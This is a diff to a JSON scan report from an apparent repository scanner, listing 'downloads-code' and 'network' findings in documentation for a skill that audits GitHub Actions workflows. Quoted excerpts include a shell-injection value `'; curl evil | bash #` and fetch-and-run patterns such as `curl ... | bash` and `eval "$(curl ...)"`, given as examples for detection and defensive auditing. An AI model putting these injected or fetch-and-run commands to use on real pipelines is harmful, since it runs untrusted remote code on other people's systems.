@@ -12,8 +12,8 @@
   "repoCreatedAt": "2026-03-22T13:03:59Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-19T10:50:00.942Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-21T10:21:16.775Z",
   "scan": {
     "findings": [
       {
@@ -54,6 +54,14 @@
       },
       {
         "ruleId": "downloads-code",
+        "file": "dot-claude/skills/audit-github-actions/composite-actions.md",
+        "line": 30,
+        "excerpt": "The consumer's caller controls `inputs.user-supplied`. If they pass `'; curl evil | bash #` and the input lands in a `run:` block, that is shell injection in th",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
         "file": "dot-claude/skills/audit-github-actions/remediation.md",
         "line": 230,
         "excerpt": "- run: uvx zizmor --format sarif . > zizmor.sarif",
@@ -91,18 +99,89 @@
         "excerpt": "`curl ... | bash`, `wget ... -O - | sh`, downloading a binary and `chmod +x` without checksum/signature verification.",
         "disclosed": false,
         "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "dot-claude/skills/audit-github-actions/tools.md",
+        "line": 9,
+        "excerpt": "| [`zizmor`](https://github.com/zizmorcore/zizmor) | Workflow + composite action static analysis: template injection, unpinned actions, excessive permissions, d",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "dot-claude/skills/audit-github-actions/tools.md",
+        "line": 10,
+        "excerpt": "| [`actionlint`](https://github.com/rhysd/actionlint) | Syntactic + shellcheck for `run:` blocks. Catches glob errors, deprecated actions, expression issues. | ",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "dot-claude/skills/audit-github-actions/tools.md",
+        "line": 11,
+        "excerpt": "| [`pinact`](https://github.com/suzuki-shunsuke/pinact) | Verifies every `uses:` line is pinned to a 40-char SHA (`--check`) and that the SHA actually matches t",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "dot-claude/skills/audit-github-actions/tools.md",
+        "line": 19,
+        "excerpt": "- **Owner-liveness / repojacking** probe (`curl -sI https://github.com/<owner>` — a 404 or 3xx redirect means the namespace is unclaimed or renamed, exposing fu",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "github.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "dot-claude/skills/audit-github-actions/workflows.md",
+        "line": 123,
+        "excerpt": "### 12. `curl | bash` and remote opaque execution (HIGH)",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "dot-claude/skills/audit-github-actions/workflows.md",
+        "line": 125,
+        "excerpt": "`run:` blocks fetching code from the network and executing it (`curl -fsSL ... | bash`, `wget -qO- ... | sh`, `eval \"$(curl ...)\"`, downloading a binary and `ch",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "dot-claude/skills/audit-github-actions/workflows.md",
+        "line": 125,
+        "excerpt": "`run:` blocks fetching code from the network and executing it (`curl -fsSL ... | bash`, `wget -qO- ... | sh`, `eval \"$(curl ...)\"`, downloading a binary and `ch",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "dot-claude/skills/audit-github-actions/workflows.md",
+        "line": 155,
+        "excerpt": "Use `curl -sI -o /dev/null -w \"%{http_code} %{redirect_url}\\n\" https://github.com/<owner>` (no auth needed, public endpoint). Cache results per-owner to avoid r",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "github.com"
+        ]
       }
     ],
     "findingTotals": {
-      "network": 2,
-      "downloads-code": 5,
+      "network": 5,
+      "downloads-code": 11,
       "shell": 2
     },
     "score": 79,
     "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 5,
-    "filesSkipped": 4
+    "filesScanned": 9,
+    "filesSkipped": 0
   },
   "history": [
     {
